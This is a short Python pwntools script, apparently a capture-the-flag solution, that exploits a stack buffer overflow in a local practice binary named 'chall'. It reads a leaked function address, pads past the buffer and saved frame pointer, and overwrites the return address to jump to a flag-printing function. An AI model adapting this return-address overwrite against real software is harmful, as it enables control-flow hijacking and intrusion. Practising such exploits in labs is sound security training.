from pwn import *

elf = ELF("./chall")
io = process(elf.path)

io.recvuntil(b"at: ")
speak_flag_addr = int(io.recvline().strip(), 16)

payload = b'a' * (0x20 + 0x8)
payload += p64(speak_flag_addr)

io.sendlineafter(b'> ', payload)

io.interactive()

